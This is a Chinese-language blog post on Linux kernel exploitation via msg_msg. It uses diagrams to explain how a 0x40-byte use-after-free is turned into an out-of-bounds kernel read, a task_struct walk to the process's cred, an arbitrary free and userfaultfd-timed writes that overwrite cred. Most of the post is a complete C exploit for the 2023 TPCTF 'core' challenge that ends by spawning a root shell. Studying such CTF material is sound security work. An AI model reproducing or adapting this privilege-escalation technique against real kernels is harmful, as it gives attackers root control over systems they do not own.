---
layout: post
title: Linux kernel基础：msg_msg专题
category: kernel pwn
date: 2024-7-01 14:00:00
---
kernel初恋msg_msg
<!-- more -->

[toc]

# Linux kernel之msg_msg

先记录一下国外师傅对`0x1000`和`0x40`的`UAF`的打法的图示，其他的有空再补。

其中，`0x1000`的较为简单，而`0x40`的复杂一点点。

## 0x00. kmalloc-0x1000 msg_msg利用方法

待补充

## 0x01. kmalloc-0x40 msg_msg利用方法

构成如下情况（图中`QID`表示`msg_id`，`#i`表示该`msg_id`的第`i`条消息）

- 建立一个`0x40`的`UAF obj`，即`MSG#0 QID0`
- 建立一个`0x40`的`msg_msg`，即`MSG#0 QID1`
- 在`QID 1`再次发送一条消息，长度为`0x1000-0x30+0x1000-8`，即`MSG#1 QID1`和`MSG#2 QID1`，分别为`msg_msg`和`msg_msgseg`

![ff50dd94-6d01-482e-a137-6a1728a4a4c8](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesff50dd94-6d01-482e-a137-6a1728a4a4c8.png)



修改`UAF obj`（`MSG#0 QID0`）的`m_ts`字段，通过`MSG_COPY`越界读到内核基地址，并读到`MSG#0 QID1`的`next`指针，其为`MSG#1 QID1`的地址。

![d13eff05-41a4-4818-af2b-d46fb9450584](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesd13eff05-41a4-4818-af2b-d46fb9450584.png)

随后不断修改`UAF obj`的`m_Ts`字段，从`init_task`开始不断遍历`task_struct`，直到找到本进程的`cred`地址。

注意，图中的`m_ts`有误，应该为`0x1000-0x30+0x1000-8`.

![74603367-2e06-4570-9eef-46e383faf67d](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images74603367-2e06-4570-9eef-46e383faf67d.png)

随后，释放`QID 1`的两条消息，其为`FIFO`：

- 先释放`MSG#0 QID1`。即`m_ts`为`0x10`的消息。
- 再释放`MSG#1 QID1`和`MSG#2 QID1`。即`m_ts`为`0x1000-0x30+0x1000-8`的消息。

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images7e4b56a9cae624e94a07b11e8ce96619.png)

申请一个新的`msg_msg`结构体`MSG#0 QID2`和`MSG#1 QID2`，由于`freelist`先进后出，因此：

- `MSG#0 QID2`是`MSG#2 QID1`，即新的`msg_msg`结构体是刚刚的`msg_msgseg`
- `MSG#1 QID2`是`MSG#1 QID1`，即新的`msg_seg`结构体是刚刚的`msg_msg`结构体，**其地址已知**
- 在新的`msg_msg`末尾使用`usefaultfd`卡住，使其不往`msg_msgseg`写内容

![ab64342e-b7b5-4a96-af89-3e892142ffbf](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesab64342e-b7b5-4a96-af89-3e892142ffbf.png)

随后：

- 改写`UAF obj`的`next`指针，使其指向已知地址的`MSG#1 QID2`
- 释放`UAF obj`，使其将`MSG#1 QID2`释放

![b6e2bb8e-a3b3-4d39-9e3d-0a556103a601](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesb6e2bb8e-a3b3-4d39-9e3d-0a556103a601.png)

随后：

- 申请新的`msg_msg`，其中`MSG#0 QID3`为刚刚释放的已知地址的`MSG#1 QID2`，并随便带一个大小的`msg_msgseg`，写内容时使用`userfaultfd`卡住

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images0c804b7751f0d7df01d12db4e6b67192.png)

随后：

- 先让第一个`msg_msg`写内容，使其改写第二个`msg_msg`的`next`为`cred`结构体
- 再让第二个`msg_msg`写内容，使其改写`cred`结构体内容为`root`

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images77fce7b7434060b63ec5b3e52835e926.png)

### demo： 2023 TPCTF core

就是`0x40`的`UAF`。

`exp`如下，注意`pthread_create`有很多噪声：

```c
#include "ltfallkernel.h"

#define ADD 0X1001
#define EDIT 0x1002
#define DELETE 0x1003

size_t init_task = 0xffffffff81c124c0;

int dev_fd;
size_t *pwn_addr;
size_t *pwn_addr2;
pthread_t p1, p2, p3;
int msg_id[10];
size_t cur_cred;
size_t msg1_q1;
int pipe_fd1[2], pipe_fd2[2], pipe_fd3[2];
size_t *buffer;

size_t *page1, *page2;

typedef struct
{
    size_t func_index;
    int index;
    size_t *content;
} request;

void add(unsigned int index)
{
    request t;
    t.index = index;
    ioctl(dev_fd, ADD, &t);
}

void edit(unsigned int index, size_t *content)
{
    request t = {
        .index = index,
        .content = content,
    };
    ioctl(dev_fd, EDIT, &t);
}

void delete(int index)
{
    request t = {
        .index = index,
    };
    ioctl(dev_fd, DELETE, &t);
}

struct msg_buf
{
    size_t mtype;
    size_t buf[1];
};

void *write_thread1()
{
    /* 释放整条 Q1 */
    // 两次申请的，分两次释放，遵循FIFO
    int res = 0;

    res = msgrcv(msg_id[1], buffer, 0x40 - 0x30, 1, 0);
    if (res != 0x40 - 0x30)
    {
        err_exit("msg_rcv Q1");
    }

    res = msgrcv(msg_id[1], buffer, 0x1000 - 0x30 + 0x1000 - 8, 1, 0);
    if (res != 0x1000 - 0x30 + 0x1000 - 8)
    {
        err_exit("msg_rcv Q1 msg1");
    }

    /* 申请新的 msg_msg 即Q2, 其msg_msg为Q1的msg_seg, msg_seg为Q1的msg_msg且地址已知 */
    info("Allocating Q2...");
    struct msg_buf *msg = (struct msg_buf *)((size_t)pwn_addr + 0x30);
    msg->mtype = 1;
    msg_id[2] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(msgsnd(msg_id[2], msg, 0x1000 - 0x30 + 0x1000 - 8, 0) < 0){
        err_exit("msg snd 2");
    };
    return NULL;
}

void *write_thread2()
{
    int res;
    char buf[1];

    /* 等待 msg_msg -> msg_seg链创建好 */
    read(pipe_fd1[0], buf, 1);

    /* 申请一个临时msg_msg, 使其占用释放的msg_msg Q1的0x40的obj */
    int t_msg = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    struct msg_buf *msg = (struct msg_buf *)buffer;
    memset(buffer, 0, 0x5000);
    msg->mtype = 1;
    if (msgsnd(t_msg, buffer, 0x40 - 0x30, 0) < 0)
    {
        err_exit("msgsnd temp");
    }

    /* 利用UAF obj任意地址释放msg_seg Q1,其地址已知 */
    info("Arb freeing with msg_Seg Q1...");
    memset(buffer, 0, 0x5000);
    buffer[0] = buffer[1] = msg1_q1 + 0x1000; // makes it valid
    buffer[2] = 1;
    buffer[3] = 0x40 - 0x30; // just original size, to prevent slab_hardened_freelist
    buffer[4] = msg1_q1;
    setxattr("/exploit", "ltfall", buffer, 0x40, 0);

    memset(buffer, 0, 0x5000);
    res = msgrcv(msg_id[0], buffer, 0x40 - 0x30, 1, 0);
    if (res != 0x10)
    {
        err_exit("msgrcv Q0");
    }

    /* 申请新msg_msg, 使得已知地址的msg_seg -> target, 这里 target 选为 cred 结构体 */
    info("Allocating new msg_msg...");
    msg_id[3] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    msg = (struct msg_buf *)((size_t)pwn_addr2 + 0x30);
    msg->mtype = 1;

    // 到这里就会去执行 uffd2
    if(msgsnd(msg_id[3], msg, 0x1000 - 0x30 + 0x80 - 8, 0) < 0){
        err_exit("msgsnd 3");
    }
    
    return NULL;
}

void *uffd_handler1(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)args;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
        {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1)
        {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            err_exit("Unexpected event on userfaultfd\n");
        }

        /* Write your code here */

        /* Ends here */

        /* set the return value of copy_from/to_user */
        char buf[1];
        write(pipe_fd1[1], "A", 1); // 到这里就已经创建好了msg_msg->msg_seg,就先不执行了,通知thread2执行
        read(pipe_fd2[0], buf, 1);  // msg_seg->cred创建好了,开始写
        page1[0] = 0;          // 最后8字节
        page1[1] = 0xdeadbeaf; // m_list的后一个
        page1[2] = 1;          // m_type
        page1[3] = 0x1000 - 0x30 + 0x40 - 8;
        page1[4] = cur_cred - 8;
        /* Ends here */

        uffdio_copy.src = (unsigned long long)page1;
        uffdio_copy.dst = (unsigned long long)msg.arg.pagefault.address &
                          ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        {
            err_exit("ioctl-UFFDIO_COPY");
        }

        write(pipe_fd3[1], "A", 1);
        return NULL;
    }
}

void *uffd_handler2(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)args;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
        {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1)
        {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            err_exit("Unexpected event on userfaultfd\n");
        }

        /* Write your code here */

        /* Ends here */

        /* set the return value of copy_from/to_user */

        write(pipe_fd2[1], "A", 1); // 通知先去写msg_msg -> msg_seg
        char buf[1];
        read(pipe_fd3[0], buf, 1); // msg_msg->msg_seg执行完了,开始写msg_seg->cred
        page2[0] = 0;
        page2[1] = 9;
        page2[2] = 0;
        page2[3] = 0;
        page2[4] = 0;
        /* Ends here */

        uffdio_copy.src = (unsigned long long)page2;
        uffdio_copy.dst = (unsigned long long)msg.arg.pagefault.address &
                          ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        {
            err_exit("ioctl-UFFDIO_COPY");
        }
        return NULL;
    }
}

int main()
{
    pthread_t monitor_setx, monitor_setx2;
    bind_core(0);
    save_status();

    page1 = (size_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    page2 = (size_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    buffer = (size_t *)malloc(0x5000);

    pipe(pipe_fd1);
    pipe(pipe_fd2);
    pipe(pipe_fd3);

    dev_fd = open("/dev/baby", O_RDWR);
    if (dev_fd < 0)
    {
        err_exit("Failed to open /dev/baby");
    }

    pwn_addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    register_userfaultfd(&monitor_setx, (void *)((size_t)pwn_addr + 0x1000), 0x1000, uffd_handler1);

    pwn_addr2 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    register_userfaultfd(&monitor_setx2, (void *)((size_t)pwn_addr2 + 0x1000), 0x1000, uffd_handler2);

    // 让index=0为UAF
    add(0); // 0
    add(1); // 1
    add(2); // 3
    add(3); // 7

    delete (0);

    // 接下来申请msg_msg，会得到index=0的obj

    /* 0x00. 构造初始的msg_msg队列 */
    msg_id[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msg_id[0] < 0)
    {
        err_exit("Failed to create msg_id.");
    }

    /* MSG #0 Q0 */
    struct msg_buf *msgp = (struct msg_buf *)buffer;
    msgp->mtype = 1;
    msgp->buf[0] = 0xdeadbeaf;
    msgp->buf[1] = 0xdeadbeaf;
    if (msgsnd(msg_id[0], (void *)msgp, 0x10, 0) < 0)
    {
        err_exit("Failed to snd msg.");
    }

    msg_id[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msg_id[1] < 0)
    {
        err_exit("Failed to create msg_msg queue1.");
    }

    /* MSG #0 Q1 */
    msgp->mtype = 1;
    msgp->buf[0] = 0xc0dec0fe;
    msgp->buf[1] = 0xc0dec0fe;
    if (msgsnd(msg_id[1], (void *)msgp, 0x10, 0) < 0)
    {
        err_exit("Failed to snd msg2.");
    }

    /* MSG #1 Q1 */
    msgp->mtype = 1;
    msgp->buf[0] = msgp->buf[1] = 0xcafebabe;
    if (msgsnd(msg_id[1], (void *)msgp, 0x1000 - 0x30 + 0x1000 - 0x8, 0) < 0)
    {
        err_exit("Failed to snd msg3");
    }

    // 使得 MSG#0 Q0为 UAF obj
    add(0xffff);
    delete (0);

    /* 越界读，泄露MSG0 QID 1上的地址，其为MSG1 QID1 */
    memset(buffer, 0, 0x4000);
    buffer[0] = buffer[1] = 0;
    buffer[2] = 0;
    buffer[3] = 0x1000 - 0x30;
    setxattr("/exploit", "ltfall", buffer, 0x40, 0);

    memset(buffer, 0, 0x4000);
    if (msgrcv(msg_id[0], buffer, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY) < 0)
    {
        err_exit("Failed to peek msg.");
    }

    msg1_q1 = 0;
    for (int i = 0; i < 0x400; i++)
    {
        if (buffer[i] == 0xc0dec0fe && buffer[i + 1] == 0xc0dec0fe)
        {
            msg1_q1 = buffer[i - 6];
            break;
        }
    }
    if (!msg1_q1)
    {
        err_exit("Failed to find msg_q1.");
    }
    leak_info("msg1_q1", msg1_q1);

    kernel_offset = -1;
    for (int i = 0; i < 0x400; i++)
    {
        if (buffer[i] > kernel_base && (buffer[i] & 0xfff) == 0xa94)
        {
            kernel_offset = buffer[i] - 0xffffffff8104ea94;
            kernel_base += kernel_offset;
            break;
        }
        if (buffer[i] > kernel_base && (buffer[i] & 0xfff) == 0x860)
        {
            kernel_offset = buffer[i] - 0xffffffff81a15860;
            kernel_base += kernel_offset;
            break;
        }
        if (buffer[i] > kernel_base && (buffer[i] & 0xfff) == 0x380)
        {
            kernel_offset = buffer[i] - 0xffffffff81c4f380;
            kernel_base += kernel_offset;
            break;
        }
        if (buffer[i] > kernel_base && (buffer[i] & 0xfff) == 0x200)
        {
            kernel_offset = buffer[i] - 0xffffffff81c4f200;
            kernel_base += kernel_offset;
            break;
        }
        if (buffer[i] > kernel_base && (buffer[i] & 0xfff) == 0xaa0)
        {
            kernel_offset = buffer[i] - 0xffffffff81a15aa0;
            kernel_base += kernel_offset;
            break;
        }
    }

    if (kernel_offset == -1)
    {
        err_exit("Failed to leak kernel_offset.");
    }

    leak_info("kernel_offset", kernel_offset);
    leak_info("kernel_base", kernel_base);

    init_task += kernel_offset;
    leak_info("init_task", init_task);

    size_t read_pid = getpid();
    size_t cur_task = init_task;
    cur_cred = 0;
    size_t *task_task = NULL;

    int pid_index = 114;
    int tgid_index = 115;

    int next_index = 84;
    int cred_index = 167;

    while (1)
    {
        memset(buffer, 0, 0x4000);
        buffer[0] = buffer[1] = 0;
        buffer[2] = 1;
        buffer[3] = 0x1000 - 0x30 + 0x1000 - 8;
        buffer[5] = 0;

        buffer[4] = cur_task - 8;
        setxattr("/exploit", "ltfall", buffer, 0x40, 0);

        memset(buffer, 0, 0x4000);
        int res = msgrcv(msg_id[0], buffer, 0x1000 - 0x30 + 0x1000 - 8, 0, MSG_NOERROR | MSG_COPY | IPC_NOWAIT);
        if (res < 0x1000 - 0x30 + 0x1000 - 8)
            err_exit("No such long rcv.");

        task_task = (size_t *)((size_t)buffer + 8 + 0x1000 - 0x30);
        // leak_content(buffer, 0x2000 / 8);
        leak_info("thread_info", task_task[0]);
        leak_info("pid", task_task[tgid_index]);
        leak_info("next", task_task[next_index]);
        leak_info("cred", task_task[cred_index]);

        if ((task_task[tgid_index] & 0xffffffff) == read_pid)
        {
            success("find task_struct.");
            cur_cred = task_task[cred_index];
            leak_info("cur_cred", cur_cred);
            break;
        }

        cur_task = task_task[next_index] - 0x298;
        leak_info("cur_task", cur_task);
    }

    /* 由于 pthread_create 测试时存在噪声, 因此在这里就先把两个线程创了 */
    /* 逻辑是, 两个会卡住写的, 分别在一个线程 */
    /* 这两个释放, 以免噪声申请到UAF obj */
    delete (1);
    delete (3);

    pthread_create(&p1, NULL, write_thread1, NULL);
    pthread_create(&p2, NULL, write_thread2, NULL);

    sleep(3);

    pthread_join(p1, NULL);
    pthread_join(p2, NULL);

    info("checking root...");

    if (!getuid())
    {
        get_root_shell();
    }
    else
    {
        error("Not root!");
    }
    return 0;
}
```

